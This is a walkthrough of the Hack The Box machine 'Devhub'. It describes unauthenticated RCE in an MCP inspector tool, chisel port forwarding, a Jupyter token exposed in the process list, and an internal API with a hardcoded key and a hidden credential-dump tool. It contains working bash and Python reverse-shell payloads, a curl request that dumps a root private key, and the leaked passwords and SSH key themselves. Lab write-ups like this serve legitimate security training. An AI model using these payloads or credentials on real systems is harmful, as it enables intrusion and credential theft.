---
machine: Devhub
platform: Hack The Box
category: Linux
difficulty: Medium
tags: [mcpjam, unauthenticated-rce, chisel, jupyter-token-exposure, hardcoded-credentials, ssh-key-leak]
date: 2026-06-02
status: retired
summary: A Linux box hosting internal AI/dev-tooling infrastructure — testing identification and exploitation of a real-world unauthenticated remote-code-execution CVE in an MCP inspector tool, pivoting through an internally-exposed Jupyter notebook and a hardcoded-API-key backend service, for the path to root.
---

## Enumeration

nmap scan:

```bash
──(kali㉿kali)-[~/htb/devhub]
└─$ nmap -p- -T4 10.129.8.41 -oN hostscan 
Starting Nmap 7.99 ( https://nmap.org ) at 2026-06-02 09:23 -0400
Nmap scan report for 10.129.8.41
Host is up (0.041s latency).
Not shown: 65532 filtered tcp ports (no-response)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
6274/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 131.58 seconds
                                                                                                                                                                         
┌──(kali㉿kali)-[~/htb/devhub]
└─$ nmap 10.129.8.41 -p 22,80,6274 -sCV -T4 -oN fingerprinting 
Starting Nmap 7.99 ( https://nmap.org ) at 2026-06-02 09:28 -0400
Nmap scan report for 10.129.8.41
Host is up (0.042s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.15 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 35:78:2e:79:0d:87:13:05:2f:53:8e:e7:3c:55:b6:4c (ECDSA)
|_  256 dd:56:8e:bc:da:b8:38:3e:9a:cd:0b:74:ee:53:85:f8 (ED25519)
80/tcp   open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://devhub.htb/
6274/tcp open  unknown
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, Help, RPCCheck, SSLSessionReq: 
|     HTTP/1.1 400 Bad Request
|     Connection: close
|   GetRequest: 
|     HTTP/1.1 200 OK
|     access-control-allow-credentials: true
|     content-length: 466
|     content-type: text/html; charset=utf-8
|     vary: Origin
|     Date: Tue, 02 Jun 2026 13:28:16 GMT
|     Connection: close
|     <!doctype html>
|     <html lang="en">
|     <head>
|     <meta charset="UTF-8" />
|     <link rel="icon" type="image/svg+xml" href="/mcp_jam.svg" />
|     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
|     <title>MCPJam Inspector</title>
|     <script type="module" crossorigin src="/assets/index-DRYhT9Xb.js"></script>
|     <link rel="stylesheet" crossorigin href="/assets/index-XvFRNbCs.css">
|     </head>
|     <body>
|     <div id="root"></div>
|     </body>
|     </html>
|   HTTPOptions, RTSPRequest: 
|     HTTP/1.1 204 No Content
|     access-control-allow-credentials: true
|     access-control-allow-methods: GET,HEAD,PUT,POST,DELETE,PATCH
|     vary: Origin
|     content-type: text/plain; charset=UTF-8
|     Date: Tue, 02 Jun 2026 13:28:16 GMT
|_    Connection: close
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port6274-TCP:V=7.99%I=7%D=6/2%Time=6A1EDA6F%P=x86_64-pc-linux-gnu%r(Get
SF:Request,290,"HTTP/1\.1\x20200\x20OK\r\naccess-control-allow-credentials
SF::\x20true\r\ncontent-length:\x20466\r\ncontent-type:\x20text/html;\x20c
SF:harset=utf-8\r\nvary:\x20Origin\r\nDate:\x20Tue,\x2002\x20Jun\x202026\x
SF:2013:28:16\x20GMT\r\nConnection:\x20close\r\n\r\n<!doctype\x20html>\n<h
SF:tml\x20lang=\"en\">\n\x20\x20<head>\n\x20\x20\x20\x20<meta\x20charset=\
SF:"UTF-8\"\x20/>\n\x20\x20\x20\x20<link\x20rel=\"icon\"\x20type=\"image/s
SF:vg\+xml\"\x20href=\"/mcp_jam\.svg\"\x20/>\n\x20\x20\x20\x20<meta\x20nam
SF:e=\"viewport\"\x20content=\"width=device-width,\x20initial-scale=1\.0\"
SF:\x20/>\n\x20\x20\x20\x20<title>MCPJam\x20Inspector</title>\n\x20\x20\x2
SF:0\x20<script\x20type=\"module\"\x20crossorigin\x20src=\"/assets/index-D
SF:RYhT9Xb\.js\"></script>\n\x20\x20\x20\x20<link\x20rel=\"stylesheet\"\x2
SF:0crossorigin\x20href=\"/assets/index-XvFRNbCs\.css\">\n\x20\x20</head>\
SF:n\x20\x20<body>\n\x20\x20\x20\x20<div\x20id=\"root\"></div>\n\x20\x20</
SF:body>\n</html>\n")%r(HTTPOptions,F0,"HTTP/1\.1\x20204\x20No\x20Content\
SF:r\naccess-control-allow-credentials:\x20true\r\naccess-control-allow-me
SF:thods:\x20GET,HEAD,PUT,POST,DELETE,PATCH\r\nvary:\x20Origin\r\ncontent-
SF:type:\x20text/plain;\x20charset=UTF-8\r\nDate:\x20Tue,\x2002\x20Jun\x20
SF:2026\x2013:28:16\x20GMT\r\nConnection:\x20close\r\n\r\n")%r(RTSPRequest
SF:,F0,"HTTP/1\.1\x20204\x20No\x20Content\r\naccess-control-allow-credenti
SF:als:\x20true\r\naccess-control-allow-methods:\x20GET,HEAD,PUT,POST,DELE
SF:TE,PATCH\r\nvary:\x20Origin\r\ncontent-type:\x20text/plain;\x20charset=
SF:UTF-8\r\nDate:\x20Tue,\x2002\x20Jun\x202026\x2013:28:16\x20GMT\r\nConne
SF:ction:\x20close\r\n\r\n")%r(RPCCheck,2F,"HTTP/1\.1\x20400\x20Bad\x20Req
SF:uest\r\nConnection:\x20close\r\n\r\n")%r(DNSVersionBindReqTCP,2F,"HTTP/
SF:1\.1\x20400\x20Bad\x20Request\r\nConnection:\x20close\r\n\r\n")%r(DNSSt
SF:atusRequestTCP,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnection:\x2
SF:0close\r\n\r\n")%r(Help,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConne
SF:ction:\x20close\r\n\r\n")%r(SSLSessionReq,2F,"HTTP/1\.1\x20400\x20Bad\x
SF:20Request\r\nConnection:\x20close\r\n\r\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 20.32 seconds

```

Our nmap scan shows a few interesting things: We see ssh, a webserver on port 80 running nginx 1.18.0, and an unknown service running on 6274 that seems to be a webserver or atleast something that uses REST API. We also see a domain `devhub.htb` which we can add to out `/etc/hosts` and then maybe be successfully redirected by the main webpage.

This does in fact redirect us to a dev website where we see a tool called "MCP Inspector" running on port 6274. We also see that they have a Jupyter-based analytics environment running internally only on localhost:8888. This could be interesting to investigate once we get a foothold. Looking into the HTML source code we see `Ubuntu 24.04`

I will go ahead and begin fuzzing for directories and vhosts with 

```bash
┌──(kali㉿kali)-[10.10.15.78]-[~]
└─$ feroxbuster -u http://devhub.htb/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 
```

and

```bash
┌──(kali㉿kali)-[10.10.15.78]-[~]
└─$ ffuf -u http://devhub.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -H "Host: FUZZ.devhub.htb" -ac
```

Neither finds anything

## Foothold

If we go to `10.129.8.41:6274`We see MCPJam an MCP testing tool. If we go to settings we see `MCPJam Version: v1.4.2`. If we look this up we see a CVE: `CVE-2026-23744` where versions 1.4.2 and earlier are vulnerable to RCE where an attacker can craft a HTTP request that triggers the installation of an MCP server, leading to RCE. MCPJam inspector by default listens on 0.0.0.0 instead of 127.0.0.1 an attacker can trigger the RCE remotely via a simple HTTP request.

"The `/api/mcp/connect` API, which is intended for connecting to MCP servers, becomes an open entry point for unauthorized requests. When an HTTP request reaches the `/connect` route, the system extracts the `command` and `args` fields without performing any security checks, leading to the execution of arbitrary command." (https://github.com/MCPJam/inspector/security/advisories/GHSA-232v-j27c-5pp6)

We can send a burp POST to the endpoint above with the format from the PoC in the link above:

```http
POST /api/mcp/connect HTTP/1.1
Host: 10.129.8.41:6274
Content-Type: application/json

{"serverConfig":{"command":"bash","args":["-c","bash -i >& /dev/tcp/10.10.15.78/443 0>&1"],"env":{}},"serverId":"mytest"}
```

This gives us a `nc` rev shell:

```bash
──(kali㉿kali)-[10.10.15.78]-[~/htb/devhub]
└─$ nc -lvnp 443
listening on [any] 443 ...
connect to [10.10.15.78] from (UNKNOWN) [10.129.8.41] 40638
bash: cannot set terminal process group (1055): Inappropriate ioctl for device
bash: no job control in this shell
mcp-dev@devhub:/opt/mcpjam/node_modules/@mcpjam/inspector$ 
```

We can upgrade it to a TTY shell like so:

```bash
on NC listener:
python3 -c 'import pty;pty.spawn("/bin/bash")'

Ctrl+Z
stty raw -echo; fg
export TERM=xterm
```

## Lateral Movement

We don't see a user flag here but we know from earlier there is an internally hosted analyst machine we could look at now that we have access to the machine on port 8888. We also see something being hosted on port 5000 internally:

```bash
mcp-dev@devhub:~$ ss -tulnp
Netid State  Recv-Q Send-Q Local Address:Port Peer Address:PortProcess                                    
udp   UNCONN 0      0      127.0.0.53%lo:53        0.0.0.0:*                                              
udp   UNCONN 0      0            0.0.0.0:68        0.0.0.0:*                                              
tcp   LISTEN 0      128        127.0.0.1:8888      0.0.0.0:*                                              
tcp   LISTEN 0      4096   127.0.0.53%lo:53        0.0.0.0:*                                              
tcp   LISTEN 0      128        127.0.0.1:5000      0.0.0.0:*                                              
tcp   LISTEN 0      128          0.0.0.0:22        0.0.0.0:*                                              
tcp   LISTEN 0      511          0.0.0.0:80        0.0.0.0:*                                              
tcp   LISTEN 0      511          0.0.0.0:6274      0.0.0.0:*    users:(("node-MainThread",pid=1282,fd=29))
tcp   LISTEN 0      128             [::]:22           [::]:*  
```

Ideally, we could get some credentials to ssh with so we could portforward it back to our local machine. (Normally I would try to ligolo proxy it but I heard others discussing how this box doesn't work well with ligolo so I am going to leave that as a last resort.)

```bash
mcp-dev@devhub:~$ curl 127.0.0.1:5000
{"auth":"Required - X-API-Key header","endpoints":["/tools/list","/tools/call","/health"],"server":"OPSMCP","status":"operational","version":"2.1.0"}
mcp-dev@devhub:~$ 
```

We can see some other users in the `/etc/passwd` file:

```bash
mcp-dev@devhub:~$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:104::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:104:105:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
pollinate:x:105:1::/var/cache/pollinate:/bin/false
syslog:x:106:113::/home/syslog:/usr/sbin/nologin
uuidd:x:107:114::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:115::/nonexistent:/usr/sbin/nologin
tss:x:109:116:TPM software stack,,,:/var/lib/tpm:/bin/false
landscape:x:110:117::/var/lib/landscape:/usr/sbin/nologin
fwupd-refresh:x:111:118:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
usbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
sshd:x:113:65534::/run/sshd:/usr/sbin/nologin
lxd:x:999:100::/var/snap/lxd/common/lxd:/bin/false
mcp-dev:x:1001:1001::/home/mcp-dev:/bin/bash
analyst:x:1002:1002::/home/analyst:/bin/bash
_laurel:x:998:998::/var/log/laurel:/bin/false
```

We see analyst as another /bin/bash user. This is probably the account we are supposed to get to.

We see opsmcp in the /opt directory also with mcpjam:

```bash
mcp-dev@devhub:/opt$ ls
mcpjam  opsmcp
mcp-dev@devhub:/opt$ cd opsmcp
mcp-dev@devhub:/opt/opsmcp$ ls
server.py
mcp-dev@devhub:/opt/opsmcp$ cat server.py 
cat: server.py: Permission denied
mcp-dev@devhub:/opt/opsmcp$ ls -lah
total 16K
drwxr-xr-x 2 analyst analyst 4.0K May 26 08:42 .
drwxr-xr-x 4 root    root    4.0K May 26 08:42 ..
-rw-r----- 1 analyst analyst 5.9K Mar 16 21:49 server.py
```

We need analyst access to interact with the server.py file but we know thats the internal service running on port 5000, this will probably be important for rooting the machine after we get the user flag.

For now we are going to use Chisel to reverse forward our local ports to reach the remote servers 8888 internal service. According to google:

```text
Chisel reverse forwarding allows a client behind a NAT or firewall to expose local ports to a publicly accessible server, enabling external access to internal services. This is achieved by running the **Chisel server** on a machine with a public IP using the `--reverse` flag, and the **Chisel client** on the target machine connecting back to that server.
```

We setup a chisel server and then transfer the binary to the client and forward the ports like so:

```bash
# install chisel to kali
wget https://github.com/jpillora/chisel/releases/download/v1.11.5/chisel_1.11.5_linux_amd64.gz 

# make executable on kali
chmod +x chisel_1.11.5_linux_amd64

# start chisel server on kali on a unique server port
./chisel_1.11.5_linux_amd64 server -p 9000 --reverse

# Host chisel binary on kali and download from listener
wget http://10.10.15.78:8000 -O /home/mcp-dev/chisel

# On listener connect back and forward local port
./chisel client 10.10.15.78:9000 R:8888:127.0.0.1:8888
```

Now we can access the site on 127.0.0.1:8888 on our kali

We need a token or password to access the jupyter page. Normally you'd do this from checking the tokens associated with the instance by using `jupyter server list` or looking in the jupyter directory. However we can't do this as jupyter binary and directories are locked behind user `analyst`  However, because the tokens handled as a cli argument you can view it from `mcp-dev` with `ps auxww` and grep for `jupyter`

```bash
mcp-dev@devhub:/opt$ ps auxww | grep jupyter
ps auxww | grep jupyter
analyst     1053  0.0  2.4 183076 97712 ?        Ss   13:22   0:07 /home/analyst/jupyter-env/bin/python3 /home/analyst/jupyter-env/bin/jupyter-lab --ip=127.0.0.1 --port=8888 --no-browser --notebook-dir=/home/analyst/notebooks --ServerApp.token=a7f3b2c9d8e1f4a5b6c7d8e9f0a1b2c3d4e5f6a7 --ServerApp.password= --ServerApp.allow_origin= --ServerApp.disable_check_xsrf=False
root        1060  0.0  0.7 111108 28984 ?        Ss   13:22   0:03 /home/analyst/jupyter-env/bin/python3 /opt/opsmcp/server.py
mcp-dev     1974  0.0  0.0   3472  1584 ?        S    15:33   0:00 grep --color=auto jupyter
```

using this token: `a7f3b2c9d8e1f4a5b6c7d8e9f0a1b2c3d4e5f6a7` we can access the jupyter notebook

We can write a python revshell into the notebook and execute it. Ensure to hardcode IP and port because environment variables and methods that gather system information don't work in jupyter:
`import sys,socket,os,pty;s=socket.socket();s.connect(("10.10.15.78", 1234));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")`

```bash
┌──(kali㉿kali)-[10.10.15.78]-[~/htb/reactor/penelope]
└─$ python3 penelope.py -p 1234
[+] Listening for reverse shells on 0.0.0.0:1234 -> 127.0.0.1 • 10.0.2.15 • 172.18.0.1 • 172.17.0.1 • 10.10.15.78
➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
[+] [New Reverse Shell] => devhub 10.129.8.41 Linux-x86_64 👤 analyst(1002) 😍️ Session ID <1>
[+] Attempting to deploy Python Agent...
[+] PTY upgrade successful via /home/analyst/jupyter-env/bin/python3
[+] Interacting with session [1] • PTY • Menu key F12 ⇐
[+] Session log: /home/kali/.penelope/sessions/devhub~10.129.8.41-Linux-x86_64/2026_06_02-11_46_19-865.log
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
analyst@devhub:~/notebooks$ whoami
analyst
analyst@devhub:~/notebooks$ 
```

From here we can get the user.txt flag from the analyst home directory

## Privilege Escalation

Now that we have analyst we can go back and read the `server.py` file from `opsmcp`

```python
analyst@devhub:/opt/opsmcp$ cat server.py 
#!/usr/bin/env python3
"""
OPSMCP - Operations MCP Server
Internal tool for system operations management
"""

from flask import Flask, jsonify, request
import os

app = Flask(__name__)

# API Key for authentication
VALID_API_KEY = "opsmcp_secret_key_4f5a6b7c8d9e0f1a"

# Registered tools (visible)
VISIBLE_TOOLS = {
    "ops.system_status": {
        "description": "Get system status and health metrics",
        "parameters": {}
    },
    "ops.list_services": {
        "description": "List running services",
        "parameters": {}
    },
    "ops.check_disk": {
        "description": "Check disk usage",
        "parameters": {}
    },
    "ops.view_logs": {
        "description": "View recent system logs",
        "parameters": {"service": "string"}
    }
}

# Hidden tools (not in /tools/list but callable)
HIDDEN_TOOLS = {
    "ops._admin_dump": {
        "description": "Emergency credential dump - INTERNAL ONLY",
        "parameters": {"target": "string", "confirm": "boolean"}
    },
    "ops._debug_mode": {
        "description": "Enable debug mode",
        "parameters": {}
    }
}

ALL_TOOLS = {**VISIBLE_TOOLS, **HIDDEN_TOOLS}

def check_auth():
    """Check API key authentication"""
    api_key = request.headers.get('X-API-Key', '')
    return api_key == VALID_API_KEY

@app.route('/')
def index():
    return jsonify({
        "server": "OPSMCP",
        "version": "2.1.0",
        "status": "operational",
        "endpoints": ["/tools/list", "/tools/call", "/health"],
        "auth": "Required - X-API-Key header"
    })

@app.route('/health')
def health():
    return jsonify({"status": "healthy", "uptime": "14d 3h 22m"})

@app.route('/tools/list')
def list_tools():
    if not check_auth():
        return jsonify({"error": "Unauthorized", "message": "Valid X-API-Key header required"}), 401
    
    return jsonify({
        "tools": list(VISIBLE_TOOLS.keys()),
        "count": len(VISIBLE_TOOLS),
        "details": VISIBLE_TOOLS
    })

@app.route('/tools/call', methods=['POST'])
def call_tool():
    if not check_auth():
        return jsonify({"error": "Unauthorized", "message": "Valid X-API-Key header required"}), 401
    
    data = request.get_json() or {}
    tool_name = data.get('name', '')
    args = data.get('arguments', {})
    
    if not tool_name:
        return jsonify({"error": "Tool name required"}), 400
    
    if tool_name not in ALL_TOOLS:
        return jsonify({"error": f"Unknown tool: {tool_name}"}), 404
    
    # Execute tool
    if tool_name == "ops.system_status":
        return jsonify({
            "cpu": "23%",
            "memory": "1.2GB/4GB",
            "load": "0.45",
            "status": "nominal"
        })
    
    elif tool_name == "ops.list_services":
        return jsonify({
            "services": [
                {"name": "nginx", "status": "running", "pid": 1234},
                {"name": "opsmcp", "status": "running", "pid": 5678},
                {"name": "jupyter", "status": "running", "pid": 9012},
                {"name": "mcpjam", "status": "running", "pid": 3456}
            ]
        })
    
    elif tool_name == "ops.check_disk":
        return jsonify({
            "filesystems": [
                {"mount": "/", "used": "4.2G", "available": "15G", "percent": "22%"},
                {"mount": "/home", "used": "1.1G", "available": "8G", "percent": "12%"}
            ]
        })
    
    elif tool_name == "ops.view_logs":
        service = args.get('service', 'system')
        return jsonify({
            "service": service,
            "logs": [
                "[2026-01-22 10:00:01] Service started",
                "[2026-01-22 10:00:02] Listening on configured port",
                "[2026-01-22 10:15:33] Health check passed",
                "[2026-01-22 11:00:00] Routine maintenance completed"
            ]
        })
    
    elif tool_name == "ops._debug_mode":
        return jsonify({
            "debug": True,
            "message": "Debug mode enabled",
            "hidden_tools": list(HIDDEN_TOOLS.keys()),
            "note": "Debug endpoints now accessible"
        })
    
    elif tool_name == "ops._admin_dump":
        target = args.get('target', '')
        confirm = args.get('confirm', False)
        
        if not confirm:
            return jsonify({
                "error": "Confirmation required",
                "usage": "Set confirm=true to proceed",
                "warning": "This dumps sensitive credentials"
            })
        
        if target == "ssh_keys":
            try:
                with open('/root/.ssh/id_rsa', 'r') as f:
                    key_data = f.read()
                return jsonify({
                    "target": "ssh_keys",
                    "root_private_key": key_data,
                    "note": "Emergency recovery key dump"
                })
            except Exception as e:
                return jsonify({
                    "target": "ssh_keys",
                    "error": f"Could not read key: {str(e)}"
                })
        
        elif target == "passwords":
            return jsonify({
                "target": "passwords",
                "dump": {
                    "root": "$6$rounds=656000$saltsalt$hashedpassword",
                    "analyst": "JupyterN0tebook!2026",
                    "mcp-dev": "Mcp!Insp3ct0r2026"
                }
            })
        
        elif target == "tokens":
            return jsonify({
                "target": "tokens",
                "api_tokens": {
                    "admin_token": "opsmcp_admin_7f3b9c2d1e4f5a6b",
                    "service_token": "opsmcp_svc_8c9d0e1f2a3b4c5d"
                }
            })
        
        else:
            return jsonify({
                "error": "Invalid target",
                "valid_targets": ["ssh_keys", "passwords", "tokens"]
            })
    
    return jsonify({"error": "Tool execution failed"}), 500

if __name__ == '__main__':
    app.run(host='127.0.0.1', port=5000, debug=False)

```

We see alot of important info in this source code: `VALID_API_KEY = "opsmcp_secret_key_4f5a6b7c8d9e0f1a"`
 And we see that we can dump passwords or ssh keys with one of the tool calls with the right request:

```python
 elif target == "passwords":
            return jsonify({
                "target": "passwords",
                "dump": {
                    "root": "$6$rounds=656000$saltsalt$hashedpassword",
                    "analyst": "JupyterN0tebook!2026",
                    "mcp-dev": "Mcp!Insp3ct0r2026"
                }
            })
 ```

We also get creds for analyst and mcp-dev but we need root access at this point. We could maybe use the analyst creds for ssh portforwarding for ease of use potentially though. Upon trying this ssh fails.

We can build this POST request to call `ops._admin_dump` and specify to dump `ssh_keys` 

```bash
curl -X POST http://127.0.0.1:5000/tools/call \
  -H "Content-Type: application/json" \
  -H "X-API-Key: opsmcp_secret_key_4f5a6b7c8d9e0f1a" \
  -d '{"name":"ops._admin_dump","arguments":{"target":"ssh_keys","confirm":true}}'
```

```bash
analyst@devhub:/opt/opsmcp$ curl -X POST http://127.0.0.1:5000/tools/call \
  -H "Content-Type: application/json" \
  -H "X-API-Key: opsmcp_secret_key_4f5a6b7c8d9e0f1a" \
  -d '{"name":"ops._admin_dump","arguments":{"target":"ssh_keys","confirm":true}}'
{"note":"Emergency recovery key dump","root_private_key":"-----BEGIN OPENSSH PRIVATE KEY-----\nb3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn\nNhAAAAAwEAAQAAAQEAwWHw4Iv8yDwyqOacO5uB2OFr/RaD1TF192ptgJXu0vj5STypOUH9\nG/jqltqP312IONAX9LwvTne81E4h+hi2xdjwgvh27iE4AvCQolR8S0GWHwHQjjXVQ5/dHX\n8MA96Qabow623zQe5D6PUAsFj6aWP5fDceIziAxkLIMgpsE6I0bWOKaGmgEG0rW1I/mw8z\n6HmooVORQsQoTaVUhnUmRJRcLpQEu94hzb+0kQ0ObKikcDTnit1kQ/7ZUOoyGhUgEwVk/n\nGhm2D96OW/JLpMIowwDxnka+3l9u5Aj55Y9fWN9aGld5pVvcoPRZ7twODIbXNSjzWsLQRQ\n7l8/a2M+aQAAA8BGnYWeRp2FngAAAAdzc2gtcnNhAAABAQDBYfDgi/zIPDKo5pw7m4HY4W\nv9FoPVMXX3am2Ale7S+PlJPKk5Qf0b+OqW2o/fXYg40Bf0vC9Od7zUTiH6GLbF2PCC+Hbu\nITgC8JCiVHxLQZYfAdCONdVDn90dfwwD3pBpujDrbfNB7kPo9QCwWPppY/l8Nx4jOIDGQs\ngyCmwTojRtY4poaaAQbStbUj+bDzPoeaihU5FCxChNpVSGdSZElFwulAS73iHNv7SRDQ5s\nqKRwNOeK3WRD/tlQ6jIaFSATBWT+caGbYP3o5b8kukwijDAPGeRr7eX27kCPnlj19Y31oa\nV3mlW9yg9Fnu3A4Mhtc1KPNawtBFDuXz9rYz5pAAAAAwEAAQAAAQAjgZkZkXpjRXJDwrvS\n0fWgXZtXR8gC3+b5+4eJgX3tLJuQz9t+UNhpR2XDNvQNnf3B+Ks9W0QQUznPfV0Nr3X3k6\nJtWbN0e5LuLz9PHtYHd05Z+RpS0h2LIhIWNVp+Z2H6l54dy/1LELVVU47B0kSAD0Qig3g8\nHUa/oEljrrgzTlYflRHhkHQblmd9ZaClUoxIDh0zf2Esmp3nIRBm4J1OX5UQPiPEa7/LkB\ndcQr1K4Z1pbZglc5wPUJZCv8MtVPvW9rCgERl9Sl4bKevsgS4mMMUvVxNdqyasYqNAXi/L\nCvk9YYP9PS4q1dfCYMIvsJJNyoBtUiCJwqW2ba6hs1vVAAAAgDEPkj6UOdX1B872cHrja2\nnkahzlja7GZw3G2+hsib4kH/G1nwQs9RRtnzqf/mrXeEhxB27ZN+QE39e7yTC3r6f84mSn\nMz/gS3Czh6DtP+S18jV4xCeac/SoLuxgLvPZ3xnHWvPO6HePQzyVlVk/MBfp+yPrCpIiHK\nMtVMaeJXFYAAAAgQDSlTQAPhkFhsswOcohRO+1hd/4xdD9UECem1ytsb5/on47/GEWvtQI\noocmAAMvEYlOvs8GXeYkMBAwi5VCjLunNBCmuRMjTEgE7lqgdhfkK0Lx/a4BWnYaki+xbk\nJt9XB5f2NlmnT4A5QqiO+qPYA2i1iF9CSv5ypxqHFChgMZNwAAAIEA6xcR6lBjwgtKuzRQ\nnI+f8DFRxcdfKY1gs0BmfS0RRxwDzIEwJHYafyHnq/CKBTDPCYyn/VI+mF64hhtjUbDgAr\nC8X6q/4LJecp3piSHgv6yXhpzkxtz+Q/JSXPFf/9NAgVFQtUjrrnGZbP9kNySaX6q6/npK\nlFORwv9PYfxftV8AAAALcm9vdEBkZXZodWI=\n-----END OPENSSH PRIVATE KEY-----\n","target":"ssh_keys"}
analyst@devhub:/opt/opsmcp$ 

```

When we save this private key we need to `chmod 600` it or else we get `WARNING: UNPROTECTED PRIVATE KEY FILE!`

I was still getting `Load key "privkey": error in libcrypto: unsupported` so I did some clauding and got this regex to fix the formatting (translates the newlines): `sed -i 's/\\n/\n/g' privkey`

After this you can ssh into root with the private key: `ssh -i privkey root@<ip>` 

Now we can grab the root flag and the box is solved!
